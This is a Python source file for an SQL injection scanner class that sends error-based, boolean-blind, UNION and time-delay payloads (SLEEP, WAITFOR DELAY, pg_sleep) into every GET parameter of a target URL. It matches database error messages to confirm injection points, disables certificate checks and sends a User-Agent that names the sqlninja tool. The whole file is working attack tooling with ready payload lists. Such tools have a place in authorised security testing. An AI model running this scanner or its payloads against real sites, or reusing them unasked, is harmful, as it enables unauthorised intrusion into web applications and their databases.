import time
import requests
from typing import List
from urllib.parse import parse_qs, urlparse, urlencode, urlunparse

class SQLiEngine:
    """Linux-grade SQL Injection Suite: Error, Boolean, Union, Time-based"""

    # DB-specific error fingerprints
    DB_ERRORS = {
        "MySQL":      ["You have an error in your SQL syntax", "mysql_fetch_array", "mysqli_fetch", "Warning: mysql"],
        "PostgreSQL": ["pg_query()", "PSQLException", "ERROR:  syntax error", "pg_exec()"],
        "MSSQL":      ["Unclosed quotation mark", "SqlException", "Microsoft OLE DB Provider", "Incorrect syntax near"],
        "Oracle":     ["ORA-01756", "ORA-00933", "ORA-00907", "quoted string not properly terminated"],
        "SQLite":     ["SQLite3::QueryExecutionException", "unrecognized token", "sqlite_compile_error"],
    }

    # Comprehensive payload list per technique
    ERROR_PAYLOADS = [
        "'", '"', "')", "'--", "' OR '1'='1", "' OR 1=1--", "' OR 'x'='x",
        "\" OR \"1\"=\"1", "admin'--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ]
    TIME_PAYLOADS = [
        ("MySQL",   "' AND SLEEP(5)--"),
        ("MySQL",   "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"),
        ("MSSQL",   "'; WAITFOR DELAY '0:0:5'--"),
        ("MSSQL",   "1; WAITFOR DELAY '0:0:5'--"),
        ("Postgres","' OR 1=1; SELECT pg_sleep(5)--"),
        ("Postgres","'); SELECT pg_sleep(5)--"),
    ]
    UNION_COLS = range(1, 11)  # test 1-10 columns

    def __init__(self, colors=None):
        self.colors = colors or {
            "critical": "#FF0000",
            "low": "#00FF00"
        }

    def scan(self, url: str, callback=None):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            if callback: callback("[SQLi] No GET params found. Provide URL like: http://site.com/page?id=1")
            return []

        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (compatible; sqlninja/0.3)"

        def _build_url(p, v):
            q = {k: v[0] for k, v in params.items()}
            q[p] = v
            return urlunparse(parsed._replace(query=urlencode(q)))

        def _fetch(u, timeout=8):
            try:
                return sess.get(u, timeout=timeout, verify=False)
            except: return None

        for param in params:
            base_url = _build_url(param, params[param][0])
            base_r = _fetch(base_url)
            if not base_r: continue
            base_len = len(base_r.text)
            if callback: callback(f"[SQLi] Testing param: {param} | Baseline: {base_len}B")

            # 1 ─ ERROR-BASED
            for pay in self.ERROR_PAYLOADS:
                r = _fetch(_build_url(param, pay))
                if not r: continue
                for db, sigs in self.DB_ERRORS.items():
                    if any(s in r.text for s in sigs):
                        msg = f"[SQLi][ERROR/{db}] '{param}' → {pay}"
                        if callback: callback(msg, self.colors.get("critical"))
                        findings.append({
                            "id": f"SQLI-ERROR-{db}", "title": f"Error-Based SQLi ({db})",
                            "description": f"DB error exposed via param '{param}' with payload: {pay}",
                            "severity": "CRITICAL", "category": "web",
                            "target": _build_url(param, pay), "evidence": r.text[:200]
                        })
                        break

            # 2 ─ BOOLEAN-BASED BLIND
            r_true  = _fetch(_build_url(param, f"{params[param][0]}' AND 1=1--"))
            r_false = _fetch(_build_url(param, f"{params[param][0]}' AND 1=2--"))
            if r_true and r_false:
                diff = abs(len(r_true.text) - len(r_false.text))
                if diff > 5 or (r_true.status_code != r_false.status_code):
                    msg = f"[SQLi][BOOLEAN] '{param}' → differential {diff}B / status {r_true.status_code} vs {r_false.status_code}"
                    if callback: callback(msg, self.colors.get("critical"))
                    findings.append({
                        "id": "SQLI-BOOLEAN", "title": "Boolean-Based Blind SQLi",
                        "description": f"Differential response {diff}B on param '{param}' (AND 1=1 vs AND 1=2)",
                        "severity": "CRITICAL", "category": "web",
                        "target": base_url, "evidence": f"Δ={diff}B"
                    })

            # 3 ─ UNION-BASED COLUMN ENUMERATION
            for n in self.UNION_COLS:
                nulls = ",".join(["NULL"] * n)
                pay = f"' UNION SELECT {nulls}--"
                r = _fetch(_build_url(param, pay))
                if r and "error" not in r.text.lower() and r.status_code == 200:
                    msg = f"[SQLi][UNION] '{param}' → {n} column(s) confirmed"
                    if callback: callback(msg, self.colors.get("critical"))
                    findings.append({
                        "id": "SQLI-UNION", "title": f"Union-Based SQLi ({n} cols)",
                        "description": f"UNION SELECT with {n} NULLs returned 200 on '{param}'",
                        "severity": "CRITICAL", "category": "web",
                        "target": _build_url(param, pay)
                    })
                    break

            # 4 ─ TIME-BASED BLIND
            for db_label, pay in self.TIME_PAYLOADS:
                start = time.time()
                _fetch(_build_url(param, pay), timeout=12)
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    msg = f"[SQLi][TIME/{db_label}] '{param}' → delay {elapsed:.1f}s"
                    if callback: callback(msg, self.colors.get("critical"))
                    findings.append({
                        "id": f"SQLI-TIME-{db_label}", "title": f"Time-Based Blind SQLi ({db_label})",
                        "description": f"Server paused {elapsed:.1f}s on '{param}' via: {pay}",
                        "severity": "CRITICAL", "category": "web",
                        "target": _build_url(param, pay), "evidence": f"delay={elapsed:.1f}s"
                    })
                    break

        if not findings and callback:
            callback("[SQLi] No injection points detected.", self.colors.get("low"))
        return findings
